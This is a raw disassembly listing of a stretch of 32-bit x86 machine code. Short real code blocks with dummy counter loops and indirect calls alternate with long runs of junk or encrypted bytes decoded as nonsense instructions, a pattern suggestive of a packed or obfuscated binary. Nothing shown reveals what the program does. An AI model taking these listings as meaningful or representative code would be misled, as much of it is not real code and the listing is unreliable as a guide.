  40e1de:	or     BYTE PTR [edi+ebx*4+0x77],0xb6
  40e1e3:	data16 fmul DWORD PTR [ecx+0x4c]
  40e1e7:	nop
  40e1e8:	jecxz  0x40e222
  40e1ea:	(bad)  
  40e1eb:	adc    esi,esp
  40e1ed:	sbb    eax,0xdfa82dcf
  40e1f2:	stos   BYTE PTR es:[edi],al
  40e1f3:	les    esi,FWORD PTR [ecx-0x72d66222]
  40e1f9:	xchg   edi,eax
  40e1fa:	jo     0x40e1e2
  40e1fc:	jmp    0x40e208
  40e1fe:	xchg   DWORD PTR [edi],esp
  40e200:	xchg   BYTE PTR [ecx+ebp*1+0x6c2df9c5],bl
  40e207:	add    DWORD PTR [esp+eiz*2+0x60],edx
  40e20b:	xchg   edi,eax
  40e20c:	(bad)
  40e20f:	ins    BYTE PTR es:[edi],dx
  40e210:	test   DWORD PTR [esi+0xd],esp
  40e213:	sbb    dh,dl
  40e215:	out    dx,al
  40e216:	jbe    0x40e20a
  40e218:	in     al,0xa3
  40e21a:	push   es
  40e21b:	cmp    dl,BYTE PTR [ebp+0x640e28ab]
  40e221:	(bad)  
  40e222:	fsubr  DWORD PTR [eax-0x42]
  40e225:	shl    edi,cl
  40e227:	lahf   
  40e228:	jmp    0x40e289
  40e22a:	jg     0x40e1f5
  40e22c:	iret   
  40e22d:	or     ch,BYTE PTR [edx]
  40e22f:	stos   DWORD PTR es:[edi],eax
  40e230:	sbb    BYTE PTR [eax+0x53f93758],dh
  40e236:	arpl   WORD PTR [eax],sp
  40e238:	push   es
  40e239:	aam    0xfd
  40e23b:	ins    DWORD PTR es:[edi],dx
  40e23c:	add    BYTE PTR [ecx+0x403cbb23],dh
  40e242:	sar    BYTE PTR [edi],1
  40e244:	dec    eax
  40e245:	mov    ch,0xe0
  40e247:	mov    ch,0xbc
  40e249:	dec    esp
  40e24a:	not    dh
  40e24c:	bound  esp,QWORD PTR [esp-0x59]
  40e250:	jge    0x40e2ab
  40e252:	mov    BYTE PTR [ecx],bh
  40e254:	hlt    
  40e255:	push   es
  40e256:	jb     0x40e1db
  40e258:	hlt    
  40e259:	mov    edx,0xff30df88
  40e25e:	test   eax,0x2c326bb8
  40e263:	sub    eax,DWORD PTR [eax]
  40e265:	jmp    0x34c9766d
  40e26a:	xchg   esi,eax
  40e26b:	adc    DWORD PTR [ebx-0x1a93ec06],esp
  40e271:	or     BYTE PTR [ecx+eax*2-0x52a045f2],ch
  40e278:	push   0x458d0189
  40e27d:	cld    
  40e27e:	and    DWORD PTR ds:0x42fd7d,0x0
  40e288:	mov    ecx,DWORD PTR ds:0x42fd7d
  40e28e:	inc    ecx
  40e28f:	mov    DWORD PTR ds:0x42fd7d,ecx
  40e295:	cmp    DWORD PTR ds:0x42fd7d,0x8
  40e29c:	jne    0x40e2b0
  40e2a2:	push   DWORD PTR [ebp-0x14]
  40e2a5:	push   0x5961
  40e2aa:	call   DWORD PTR ds:0x42e5e3
  40e2b0:	cmp    DWORD PTR ds:0x42fd7d,0x7
  40e2b7:	jne    0x40e2ca
  40e2bd:	mov    ecx,DWORD PTR ds:0x42fd7d
  40e2c3:	inc    ecx
  40e2c4:	mov    DWORD PTR ds:0x42fd7d,ecx
  40e2ca:	cmp    DWORD PTR ds:0x42fd7d,0x15
  40e2d1:	jb     0x40e288
  40e2d7:	and    DWORD PTR ds:0x42fdee,0x0
  40e2e1:	jmp    0x40e2f3
  40e2e6:	mov    ecx,DWORD PTR ds:0x42fdee
  40e2ec:	inc    ecx
  40e2ed:	mov    DWORD PTR ds:0x42fdee,ecx
  40e2f3:	cmp    DWORD PTR ds:0x42fdee,0x1b
  40e2fa:	jae    0x40e34c
  40e300:	cmp    DWORD PTR ds:0x42fdee,0x9
  40e307:	jne    0x40e31b
  40e30d:	push   DWORD PTR [ebp-0x28]
  40e310:	push   0x42fd81
  40e315:	call   DWORD PTR ds:0x42e4f7
  40e31b:	cmp    DWORD PTR ds:0x42fdee,0x8
  40e322:	jne    0x40e335
  40e328:	mov    ecx,DWORD PTR ds:0x42fdee
  40e32e:	inc    ecx
  40e32f:	mov    DWORD PTR ds:0x42fdee,ecx
  40e335:	jmp    0x40e2e6
  40e33a:	mov    ebx,DWORD PTR ds:0x42e814
  40e340:	mov    ecx,DWORD PTR ds:0x42e81c
  40e346:	sub    ebx,ecx
  40e348:	imul   ebx,DWORD PTR [ebx+ecx*1]
  40e34c:	mov    DWORD PTR [ebp-0x10],eax
  40e34f:	sub    ecx,ebx
  40e351:	mov    eax,DWORD PTR [ebp+0x8]
  40e354:	and    ebx,ecx
  40e356:	mov    ecx,DWORD PTR [ebp-0x10]
  40e359:	sbb    DWORD PTR ds:0x42fdf2,ecx
  40e35f:	xor    eax,esi
  40e361:	add    eax,edi
  40e363:	mov    DWORD PTR [ecx],eax
  40e365:	jmp    0x40e4cf
  40e36a:	icebp  
  40e36b:	ja     0x40e334
  40e36d:	pop    ds
  40e36e:	inc    ecx
  40e36f:	scas   eax,DWORD PTR es:[edi]
  40e370:	icebp  
  40e371:	jno    0x40e314
  40e373:	push   edi
  40e374:	inc    eax
  40e375:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e376:	pushf  
  40e377:	in     al,dx
  40e378:	in     eax,0x4c
  40e37a:	cmp    esp,DWORD PTR [eax+esi*2+0x707fc370]
  40e381:	jo     0x40e3fc
  40e383:	pop    ecx
  40e384:	pusha  
  40e385:	mov    bh,0xbb
  40e387:	icebp  
  40e388:	rcr    DWORD PTR [ebx],1
  40e38a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e38b:	lock push ds
  40e38d:	sti    
  40e38e:	sbb    eax,0xd2556eb4
  40e393:	mov    edx,0x315ae1dd
  40e398:	in     al,dx
  40e399:	and    eax,0xa916b96a
  40e39e:	(bad)  
  40e39f:	out    dx,al
  40e3a0:	gs xor eax,edx
  40e3a3:	xchg   ebx,eax
  40e3a4:	js     0x841d7268
  40e3aa:	std    
  40e3ab:	shl    al,0x34
  40e3ae:	add    eax,0x217a7ae4
  40e3b3:	arpl   WORD PTR [ecx],sp
  40e3b5:	mov    WORD PTR ds:0x10103607,?
  40e3bb:	shr    bl,1
  40e3bd:	out    dx,eax
  40e3be:	pushf  
  40e3bf:	dec    ebp
  40e3c0:	jbe    0x40e3be
  40e3c2:	and    esi,DWORD PTR [ebx-0x5f]
  40e3c5:	mov    ch,BYTE PTR [esi+0x35da00a]
  40e3cb:	jmp    0xe30e:0x151ef4ee
  40e3d2:	xor    edi,edx
  40e3d4:	cdq    
  40e3d5:	sub    al,0x30
  40e3d7:	sbb    al,0xbe
  40e3d9:	(bad)  
  40e3da:	push   edi
  40e3db:	ss adc eax,0x59d42fe0
  40e3e1:	lea    ecx,[ebx]
  40e3e3:	jge    0x40e40e
  40e3e5:	jge    0x40e390
  40e3e7:	scas   eax,DWORD PTR es:[edi]
  40e3e8:	jns    0x40e42c
  40e3ea:	rcl    BYTE PTR [esi-0x6ee334c6],1
  40e3f0:	fdivr  QWORD PTR [ebp+ebp*4+0x14220171]
  40e3f7:	aaa    
  40e3f8:	sahf   
  40e3f9:	pushf  
  40e3fa:	xchg   BYTE PTR [esi],cl
  40e3fc:	push   edi
  40e3fd:	test   al,0x3b
  40e3ff:	pop    es
  40e400:	adc    edx,esi
  40e402:	mov    WORD PTR [eax],?
  40e404:	dec    ebp
  40e405:	jp     0x40e409
  40e407:	mov    eax,ds:0xf6cb6c8f
  40e40c:	pop    edi
  40e40d:	mov    ebx,0xf99879ea
  40e412:	fcmovnu st,st(1)
  40e414:	out    0x63,al
  40e416:	mov    dh,0x5e
  40e418:	xchg   esp,eax
  40e419:	jns    0x40e39c
  40e41b:	jle    0x40e436
  40e41d:	call   0x62e68bb
  40e422:	xor    al,0xaa
  40e424:	mov    dl,0xe9
  40e426:	into   
  40e427:	mov    edi,0x66fa2ffc
  40e42c:	in     al,dx
  40e42d:	xchg   edx,eax
  40e42e:	shl    BYTE PTR [edx+0x4a],cl
  40e431:	clc    
  40e432:	adc    al,0xb9
  40e434:	cmp    BYTE PTR [ecx-0x1d84dbfe],ah
  40e43a:	inc    esi
  40e43b:	xchg   edi,eax
  40e43c:	leave  
  40e43d:	xor    eax,0x44380b96
  40e442:	push   esi
  40e443:	imul   edx,DWORD PTR [ebp-0x45],0xffffff8c
  40e447:	and    ah,cl
  40e449:	mov    dh,0xb7
  40e44b:	(bad)  
  40e44c:	mov    edx,0xf5ba69c1
  40e451:	jo     0x40e499
  40e453:	leave  
  40e454:	hlt    
  40e455:	mov    ds:0xfb76d55a,al
  40e45a:	jae    0x40e461
  40e45c:	(bad)  
  40e45d:	jmp    0x8b80:0xfa524e35
  40e464:	fisubr DWORD PTR [edx+0x69]
  40e467:	xchg   edx,eax
  40e468:	sar    edi,1
  40e46a:	inc    edx
  40e46b:	xor    ebp,esi
  40e46d:	push   eax
  40e46e:	sub    al,0xd5
  40e470:	mov    bh,0x64
  40e472:	hlt    
  40e473:	js     0x40e461
  40e475:	(bad)  
  40e476:	and    ebx,DWORD PTR [edi-0x8289ec7]
  40e47c:	es adc bl,bh
  40e47f:	(bad)  
  40e481:	mov    al,ds:0xc38dc8f8
  40e486:	xchg   esp,eax
  40e487:	pop    ecx
  40e488:	jnp    0x40e489
  40e48a:	popf   
  40e48b:	mov    DWORD PTR [edx-0x16],ebx
  40e48e:	popf   
  40e48f:	in     eax,dx
  40e490:	jns    0x40e4d1
  40e492:	ficomp DWORD PTR [edi]
  40e494:	test   DWORD PTR [edi-0x6b],ebp
  40e497:	dec    edi
  40e498:	sahf   
  40e499:	xor    bl,bh
  40e49b:	jae    0x40e44e
  40e49d:	adc    DWORD PTR [edi-0x684ab4a4],ebp
  40e4a3:	cmp    edx,DWORD PTR [ecx-0x59f845d8]
  40e4a9:	fs sbb cl,bl
  40e4ac:	inc    esi
  40e4ad:	fnstsw WORD PTR [eax-0x5e530534]
  40e4b3:	mov    esp,DWORD PTR [eax-0x30d37353]
  40e4b9:	int3   
  40e4ba:	xchg   bl,bh
  40e4bc:	mov    BYTE PTR [edi+0x6127c55f],al
  40e4c2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4c3:	mov    edx,0x196a9095
  40e4c8:	(bad)  
  40e4c9:	push   ecx
  40e4ca:	mov    dl,0xb8
  40e4cc:	sets   BYTE PTR [edx-0x39]
  40e4d0:	inc    ebp
  40e4d1:	call   0xf8dd6a07
  40e4d6:	and    ebx,0x399a
  40e4dc:	lea    eax,[ebp-0x18]
  40e4df:	mov    DWORD PTR [ebp-0x24],eax
  40e4e2:	jmp    0x40e64c
  40e4e7:	ror    DWORD PTR [eax+edi*4+0x61f15519],0x74
  40e4ef:	sbb    al,BYTE PTR ds:0x9c2f740f
  40e4f5:	pop    es
  40e4f6:	je     0x40e486
  40e4f8:	mov    ds:0x7fc37070,eax
  40e4fd:	jo     0x40e56f
  40e4ff:	js     0x40e578
  40e501:	mov    dh,0xdf
  40e503:	sti    
  40e504:	test   BYTE PTR [edx-0x123f99a6],bh
  40e50a:	cmp    DWORD PTR [eax+eax*1+0x7a],esp
  40e50e:	jmp    0x40e532
  40e510:	dec    edx
  40e511:	add    eax,0x74a6b507
  40e516:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e517:	das    
  40e518:	cdq    
  40e519:	hlt    
  40e51a:	fadd   DWORD PTR [ebp+eiz*1-0x5f703e59]
  40e521:	ss push esi
  40e523:	mov    eax,ds:0x62cd77b7
  40e528:	aaa    
  40e529:	xor    DWORD PTR [eax],0xffffffa6
  40e52c:	cmp    ebp,DWORD PTR [esi+ebp*8+0x63]
  40e530:	jge    0x40e50f
  40e532:	(bad)  
  40e534:	push   es
  40e535:	adc    ch,dl
  40e537:	push   edi
  40e538:	xchg   BYTE PTR [eax+0x3d],cl
  40e53b:	in     al,0x80
  40e53d:	sub    ah,BYTE PTR [edi]
  40e53f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e540:	sbb    ebp,DWORD PTR [ecx+edi*1+0x729541b0]
  40e547:	iret   
  40e548:	or     DWORD PTR [edi+edi*1+0x77],edi
  40e54c:	popa   
  40e54d:	push   0xb1b4da9e
  40e552:	cmp    DWORD PTR [ecx-0x64bce136],eax
  40e558:	push   ecx
  40e559:	push   es
  40e55a:	mov    dh,0xe9
  40e55c:	sbb    ch,BYTE PTR [esp+eax*4+0x3a]
  40e560:	add    eax,0x5ee52126
  40e565:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e566:	xor    al,0xe0
  40e568:	stos   DWORD PTR es:[edi],eax
  40e569:	mov    cl,0xf9
  40e56b:	inc    edi
  40e56c:	and    eax,0xbcfb2d77
  40e571:	inc    eax
  40e572:	cmp    BYTE PTR [edx-0x7567965c],ch
  40e578:	and    BYTE PTR [ecx],bh
  40e57a:	dec    ebx
  40e57b:	sub    eax,0x653213e4
  40e580:	xchg   ecx,ebx
  40e582:	and    ecx,esp
  40e584:	pushf  
  40e585:	mov    edi,0x774e8ff1
  40e58a:	clc    
  40e58b:	fisubr WORD PTR [edx-0x7789dd9b]
  40e591:	retf   0x53ee
  40e594:	jnp    0x40e559
  40e596:	lahf   
  40e597:	fstp   TBYTE PTR [edi-0x67738469]
  40e59d:	int3   
  40e59e:	pop    es
  40e59f:	pop    eax
  40e5a0:	loop   0x40e583
  40e5a2:	test   edx,esp
  40e5a4:	mov    edx,0x378ccbfd
  40e5a9:	stc    
  40e5aa:	sar    BYTE PTR [edx+0x3de5b270],1
  40e5b0:	add    bh,BYTE PTR [edi-0x59]
  40e5b3:	xchg   BYTE PTR ds:0x55bef9a6,al
  40e5b9:	popf   
  40e5ba:	add    eax,0x9da03dcc
  40e5bf:	jmp    0x40e5cf
  40e5c1:	in     eax,0x36
  40e5c3:	push   ecx
  40e5c4:	mov    bh,0xc1
  40e5c6:	in     eax,0x38
  40e5c8:	push   esi
  40e5c9:	lock ror BYTE PTR [ebx+edx*1],cl
  40e5cd:	cmp    al,0xd8
  40e5cf:	int    0xfd
  40e5d1:	gs jmp 0x40e554
  40e5d4:	sub    DWORD PTR [ecx+0x335019df],esp
  40e5da:	cmp    edx,0xffffffe7
  40e5dd:	sub    BYTE PTR [esi],0xb4
  40e5e0:	dec    edx
  40e5e1:	enter  0xa819,0xb
  40e5e5:	xchg   BYTE PTR [edi+ebp*1-0x36de95dc],bh
  40e5ec:	bound  edx,QWORD PTR [ecx-0x63]
  40e5ef:	push   edi
  40e5f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e5f1:	add    DWORD PTR [ecx-0xbd5e752],edi
  40e5f7:	pushf  
  40e5f8:	cdq    
  40e5f9:	fwait
  40e5fa:	jecxz  0x40e60d
  40e5fc:	mov    ebp,fs
  40e5fe:	das    
  40e5ff:	in     al,0x59
  40e601:	jmp    FWORD PTR [esi-0x7a]
  40e604:	push   edx
  40e605:	in     eax,0x6c
  40e607:	jno    0x40e63b
  40e609:	pusha  
  40e60a:	aam    0xff
  40e60c:	aam    0x30
  40e60e:	jmp    0xc64a5633
  40e613:	push   ebx
  40e614:	jecxz  0x40e655
  40e616:	mov    ah,0x50
  40e618:	lods   eax,DWORD PTR ds:[esi]
  40e619:	ds loope 0x40e665
  40e61c:	(bad)  
  40e61d:	lock je 0x40e652
  40e620:	scas   al,BYTE PTR es:[edi]
  40e621:	cmp    al,0xda
  40e623:	cmp    ch,BYTE PTR [ecx-0x3d]
  40e626:	shl    BYTE PTR [ecx+0x1],1
  40e629:	int3   
  40e62a:	inc    ebx
  40e62b:	mov    dh,0x7d
  40e62d:	cmp    edx,DWORD PTR [ecx+0x6]
  40e630:	rol    dh,cl
  40e632:	sub    al,0x51
  40e634:	and    ebp,DWORD PTR ds:0xbcde9f89
  40e63a:	fnsave [eax-0x3f]
  40e63d:	push   edx
  40e63e:	jmp    0x40e62e
  40e640:	out    0xfa,eax
  40e642:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e643:	sbb    WORD PTR [edi+edi*2+0x23],0x9663
  40e64a:	in     al,0xfa
  40e64c:	mov    eax,DWORD PTR [ebp-0x18]
  40e64f:	and    DWORD PTR ds:0x42fdfa,0x0
  40e659:	jmp    0x40e66b
  40e65e:	mov    ebx,DWORD PTR ds:0x42fdfa
  40e664:	inc    ebx
  40e665:	mov    DWORD PTR ds:0x42fdfa,ebx
  40e66b:	cmp    DWORD PTR ds:0x42fdfa,0x1e
  40e672:	jae    0x40e697
  40e678:	cmp    DWORD PTR ds:0x42fdfa,0x24
  40e67f:	jne    0x40e690
  40e685:	push   0x1cae
  40e68a:	call   DWORD PTR ds:0x42e4fb
  40e690:	jmp    0x40e65e
  40e695:	neg    ebx
  40e697:	mov    ecx,DWORD PTR [ebp-0x24]
  40e69a:	add    ebx,0x74bf
  40e6a0:	xor    eax,esi
  40e6a2:	add    eax,edi
  40e6a4:	sub    DWORD PTR ds:0x42e19c,edx
  40e6aa:	mov    DWORD PTR [ecx],eax
  40e6ac:	mov    eax,ds:0x41b27c
  40e6b1:	adc    DWORD PTR ds:0x42fd81,ebx
  40e6b7:	mov    ebx,0x8e12febe
  40e6bc:	mov    DWORD PTR [ebp-0xc],ebx
  40e6bf:	adc    DWORD PTR ds:0x42fd59,0x7944
  40e6c9:	jmp    0x40e833
  40e6ce:	cmp    dl,bl
  40e6d0:	in     al,dx
  40e6d1:	fcomi  st,st(1)
  40e6d3:	jecxz  0x40e69e
  40e6d5:	icebp  
  40e6d6:	xor    al,0x3a
  40e6d8:	iret   
  40e6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e6da:	sbb    DWORD PTR [edi-0x5daebd7f],esi
  40e6e0:	jo     0x40e752
  40e6e2:	ret    
  40e6e3:	jg     0x40e755
  40e6e5:	jo     0x40e736
  40e6e7:	cli    
  40e6e8:	dec    ebx
  40e6e9:	out    dx,eax
  40e6ea:	hlt    
  40e6eb:	cmp    ch,BYTE PTR [esi+edx*8-0x41]
  40e6ef:	sub    al,0xae
  40e6f1:	mov    ds:0xa5ee1694,eax
  40e6f6:	(bad)  
  40e6f8:	mov    eax,0xd16ec068
  40e6fd:	adc    al,0x4b
  40e6ff:	test   al,0x67
  40e701:	jle    0x40e774
  40e703:	xchg   ecx,eax
  40e704:	je     0x40e6e7
  40e706:	mov    esp,0x1c8d270e
  40e70b:	(bad)  
  40e70c:	xor    edx,edx
  40e70e:	sub    BYTE PTR [edx+edi*2+0x60],0x22
  40e713:	jp     0x40e70e
  40e715:	mov    DWORD PTR [ebp-0x622f4647],ecx
  40e71b:	dec    ecx
  40e71c:	in     al,0x4
  40e71e:	jge    0x40e6b1
  40e720:	dec    ebp
  40e721:	cmp    edi,DWORD PTR gs:[eax+0x2]
  40e725:	mov    ds:0xdeba767,eax
  40e72a:	inc    edi
  40e72b:	aam    0xa8
  40e72d:	sahf   
  40e72e:	adc    BYTE PTR [eax],0x65
  40e731:	mov    ah,0x49
  40e733:	push   esp
  40e734:	jmp    0x8419:0x16db3aba
  40e73b:	pop    ecx
  40e73c:	jl     0x40e6c1
  40e73e:	xchg   edi,eax
  40e73f:	arpl   WORD PTR [edx],cx
  40e741:	ret    0x5a9c
  40e744:	cdq    
  40e745:	test   DWORD PTR ds:0xed665a09,0x28dc2000
  40e74f:	mov    edx,0x7eba9d69
  40e754:	test   eax,0xae4d8541
  40e759:	ret    
  40e75a:	or     cl,al
  40e75c:	sbb    BYTE PTR [ebx-0x51],dl
  40e75f:	dec    ebp
  40e760:	sub    ebp,ebx
  40e762:	sahf   
  40e763:	jo     0x40e7d4
  40e765:	add    DWORD PTR [ebx],edi
  40e767:	add    bh,al
  40e769:	add    eax,0xa4778299
  40e76e:	jo     0x40e785
  40e770:	inc    edx
  40e771:	test   eax,0xb1ee68de
  40e776:	push   edi
  40e777:	mov    esi,0x4d3ed39a
  40e77c:	xchg   esi,eax
  40e77d:	adc    BYTE PTR [ebx-0xe2568f2],ch
  40e783:	fbstp  TBYTE PTR [ecx-0x572af95e]
  40e789:	and    eax,0x36c178e5
  40e78e:	fucomip st,st(6)
  40e790:	(bad)  
  40e791:	and    ecx,DWORD PTR [ebp-0x42]
  40e794:	in     eax,dx
  40e795:	push   edi
  40e796:	or     al,0x65
  40e798:	scas   eax,DWORD PTR es:[edi]
  40e799:	scas   eax,DWORD PTR es:[edi]
  40e79a:	mov    edx,0x341e22aa
  40e79f:	and    al,BYTE PTR [edx]
  40e7a1:	mov    al,0x20
  40e7a3:	dec    eax
  40e7a4:	jb     0x40e777
  40e7a6:	and    BYTE PTR [edx],cl
  40e7a8:	aad    0x44
  40e7aa:	mov    ebx,0xce2aa11
  40e7af:	fistp  QWORD PTR [ebp+0x72]
  40e7b2:	lds    edi,FWORD PTR [edx+0x22]
  40e7b5:	fs push eax
  40e7b7:	das    
  40e7b8:	cmp    eax,0x19750fb7
  40e7bd:	add    edi,esp
  40e7bf:	pop    edx
  40e7c0:	xchg   BYTE PTR [edi-0x35c6ed86],bh
  40e7c6:	adc    DWORD PTR [eax+0x3e7b03c9],esp
  40e7cc:	xchg   BYTE PTR [edx],dh
  40e7ce:	clc    
  40e7cf:	popa   
  40e7d0:	inc    edi
  40e7d1:	ror    DWORD PTR [ecx],0xac
  40e7d4:	mov    edx,0x1047771f
  40e7d9:	imul   edx,DWORD PTR [eax-0x57],0x29
  40e7dd:	cmp    al,0x2a
  40e7df:	inc    ebx
  40e7e0:	(bad)  
  40e7e1:	rcr    bl,1
  40e7e3:	xchg   edx,eax
  40e7e4:	mov    ds:0x7769d567,al
  40e7e9:	mov    eax,0x46cb0ab6
  40e7ee:	adc    eax,0x30e804a4
  40e7f3:	sbb    ebp,DWORD PTR ds:0xf4e19a8c
  40e7f9:	sub    eax,0x877e4a99
  40e7fe:	push   es
  40e7ff:	aaa    
  40e800:	adc    DWORD PTR [edx+edi*4-0x7c5ad56f],0x42
  40e808:	jne    0x40e875
  40e80a:	cmp    BYTE PTR [ebx-0x563f04d3],cl
  40e810:	test   al,0x3d
  40e812:	adc    eax,0x4005c329
  40e817:	or     BYTE PTR [edi-0x39],al
  40e81a:	mov    al,0x81
  40e81c:	aaa    
  40e81d:	out    0x16,eax
  40e81f:	xchg   edx,ecx
  40e821:	adc    eax,0xdead4839
  40e826:	mov    bl,0xbd
  40e828:	xor    dl,BYTE PTR [eax-0x762041e1]
  40e82e:	add    DWORD PTR [eax-0x74764237],ebp
  40e834:	add    BYTE PTR [ecx+0x42fd6915],al
  40e83a:	add    BYTE PTR [edi+0x50],ah
  40e83d:	add    BYTE PTR [eax],al
  40e83f:	mov    cx,WORD PTR [ebp-0x4]
  40e843:	xor    DWORD PTR ds:0x42fd8d,0x42fdfe
  40e84d:	movzx  ecx,cx
  40e850:	add    ecx,DWORD PTR [eax]
  40e852:	neg    eax
  40e854:	mov    DWORD PTR [ebp-0x14],0xf89c853d
  40e85b:	sbb    eax,0x5a1e
  40e860:	mov    DWORD PTR [ebp-0x1c],ecx
  40e863:	mov    eax,DWORD PTR [ebp+0x8]
  40e866:	sbb    ecx,DWORD PTR ds:0x42fd61
  40e86c:	mov    ecx,DWORD PTR [ebp-0x8]
  40e86f:	xor    DWORD PTR ds:0x42e19c,0x42e76f
  40e879:	xor    eax,esi
  40e87b:	and    DWORD PTR ds:0x42e78b,0x57ad
  40e885:	add    eax,edi
  40e887:	cmp    DWORD PTR [ecx],eax
  40e889:	jne    0x40efe4
  40e88f:	and    DWORD PTR ds:0x42fd51,0x0
  40e899:	jmp    0x40e8ab
  40e89e:	mov    ecx,DWORD PTR ds:0x42fd51
  40e8a4:	inc    ecx
  40e8a5:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ab:	cmp    DWORD PTR ds:0x42fd51,0x11
  40e8b2:	jae    0x40e8fe
  40e8b8:	cmp    DWORD PTR ds:0x42fd51,0x8
  40e8bf:	jne    0x40e8d0
  40e8c5:	push   0x42e267
  40e8ca:	call   DWORD PTR ds:0x42e4ff
  40e8d0:	cmp    DWORD PTR ds:0x42fd51,0x7
  40e8d7:	jne    0x40e8ec
  40e8dd:	xor    ecx,ecx
  40e8df:	add    ecx,DWORD PTR ds:0x42fd51
  40e8e5:	inc    ecx
  40e8e6:	mov    DWORD PTR ds:0x42fd51,ecx
  40e8ec:	jmp    0x40e89e
  40e8f1:	movzx  ecx,BYTE PTR ds:0x42fe0a
  40e8f8:	adc    DWORD PTR ds:0x42e77f,ecx
  40e8fe:	mov    eax,DWORD PTR [ebp+0x8]
  40e901:	xor    DWORD PTR ds:0x42e777,0x70e3
  40e90b:	mov    ecx,DWORD PTR [ebp-0x1c]
  40e90e:	and    DWORD PTR ds:0x42e77b,0x42e76f
  40e918:	xor    eax,esi
  40e91a:	not    DWORD PTR ds:0x42fd81
  40e920:	add    eax,edi
  40e922:	mov    DWORD PTR ds:0x42fd8d,0x37d2
  40e92c:	cmp    DWORD PTR [ecx],eax
  40e92e:	mov    DWORD PTR ds:0x42e78b,0x263d
  40e938:	jmp    0x40eaa2
  40e93d:	(bad)  
  40e93e:	(bad)  
  40e93f:	fistp  DWORD PTR [ebx+0x65445961]
  40e945:	shl    BYTE PTR [edi-0x39],0x63
  40e949:	in     eax,dx
  40e94a:	clts   
  40e94c:	mov    al,ds:0x7070a024
  40e951:	ret    
  40e952:	jg     0x40e9c4
  40e954:	jo     0x40e92a
  40e956:	xchg   edi,eax
  40e957:	dec    esp
  40e958:	mov    bl,BYTE PTR [eax-0x70]
  40e95b:	int3   
  40e95c:	mov    DWORD PTR [ebp+edi*2-0x66],ebp
  40e960:	outs   dx,BYTE PTR ds:[esi]
  40e961:	push   eax
  40e962:	sahf   
  40e963:	push   cs
  40e964:	xchg   ecx,eax
  40e965:	push   ebx
  40e966:	jae    0x40e98f
  40e968:	bound  esi,QWORD PTR [esi+eiz*1-0x50]
  40e96c:	faddp  st(1),st
  40e96e:	dec    esi
  40e96f:	sub    BYTE PTR [ebx],0xe9
  40e972:	mov    eax,0x2835b062
  40e977:	imul   edx,ebp,0xffffff9a
  40e97a:	or     BYTE PTR [edi+0x11],dh
  40e97d:	jnp    0x40e935
  40e97f:	outs   dx,DWORD PTR ds:[esi]
  40e980:	in     eax,0xdf
  40e982:	or     bh,BYTE PTR [ecx+0x5]
  40e985:	adc    ecx,ecx
  40e987:	mov    bl,0xb4
  40e989:	add    BYTE PTR [ecx],bl
  40e98b:	je     0x40e975
  40e98d:	mov    al,0x81
  40e98f:	xor    BYTE PTR [ebx-0x4f09c0e2],ah
  40e995:	push   ebx
  40e996:	fidivr WORD PTR ds:0x8b89169d
  40e99c:	xor    BYTE PTR [edi+0x66],bh
  40e99f:	std    
  40e9a0:	shl    cl,cl
  40e9a2:	sahf   
  40e9a3:	fdivr  st,st(1)
  40e9a5:	arpl   WORD PTR [edi-0x4b],si
  40e9a8:	cdq    
  40e9a9:	ror    DWORD PTR [ecx+0x23],0xcc
  40e9ad:	stc    
  40e9ae:	scas   eax,DWORD PTR es:[edi]
  40e9af:	jmp    0x40e940
  40e9b1:	jb     0x40e94d
  40e9b3:	lds    edx,FWORD PTR [eax+0x70163f88]
  40e9b9:	adc    DWORD PTR [eax],0x42
  40e9bc:	shl    DWORD PTR [eax],cl
  40e9be:	mov    edi,DWORD PTR [ebp+0x2006b34e]
  40e9c4:	adc    DWORD PTR [esi],ecx
  40e9c6:	adc    ah,0x26
  40e9c9:	sbb    DWORD PTR [ecx],esi
  40e9cb:	xor    ebx,DWORD PTR [ebx+0x735debd1]
  40e9d1:	push   ecx
  40e9d2:	inc    ecx
  40e9d3:	(bad)  [esi+ecx*8]
  40e9d6:	mov    ds:0xb1ab252a,al
  40e9db:	xchg   esi,eax
  40e9dc:	arpl   WORD PTR [edi],bx
  40e9de:	out    dx,al
  40e9df:	jne    0x40e9f2
  40e9e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9e2:	test   al,0x66
  40e9e4:	int    0x10
  40e9e6:	ror    DWORD PTR [edx+eiz*8-0x6],0xc1
  40e9eb:	arpl   WORD PTR [di],sp
  40e9ee:	xchg   edi,eax
  40e9ef:	cmp    BYTE PTR [esi+0x74a518c8],0x12
  40e9f6:	lods   eax,DWORD PTR ds:[esi]
  40e9f7:	xchg   edx,eax
  40e9f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e9f9:	hlt    
  40e9fa:	ds xchg edi,eax
  40e9fc:	gs mov esp,0xd088baea
  40ea02:	jecxz  0x40ea5e
  40ea04:	in     eax,0x84
  40ea06:	repnz stos DWORD PTR es:[edi],eax
  40ea08:	mov    eax,ds:0xb73fdeba
  40ea0d:	stos   DWORD PTR es:[edi],eax
  40ea0e:	push   ss
  40ea0f:	lahf   
  40ea10:	mov    ecx,0x5e9c57a9
  40ea15:	dec    edi
  40ea16:	sub    eax,0x24ccc2a5
  40ea1b:	adc    eax,0xba51164b
  40ea20:	enter  0xee12,0x10
  40ea24:	test   BYTE PTR [ecx+esi*4],cl
  40ea27:	fld    DWORD PTR [ecx+0x6b7bdbe9]
  40ea2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea2e:	push   eax
  40ea2f:	fidivr WORD PTR [ebp-0x7672a885]
  40ea35:	in     al,dx
  40ea36:	push   es
  40ea37:	adc    BYTE PTR [ebp-0x11a0f83],bh
  40ea3d:	mov    al,ds:0x4bbd5f50
  40ea42:	mov    bh,0xfd
  40ea44:	dec    esp
  40ea45:	sbb    ebx,DWORD PTR [edi+0x71]
  40ea48:	mov    al,ds:0xf5862ce6
  40ea4d:	arpl   WORD PTR [edx-0x7ed91988],di
  40ea53:	out    0xbc,al
  40ea55:	jmp    0x95d977c
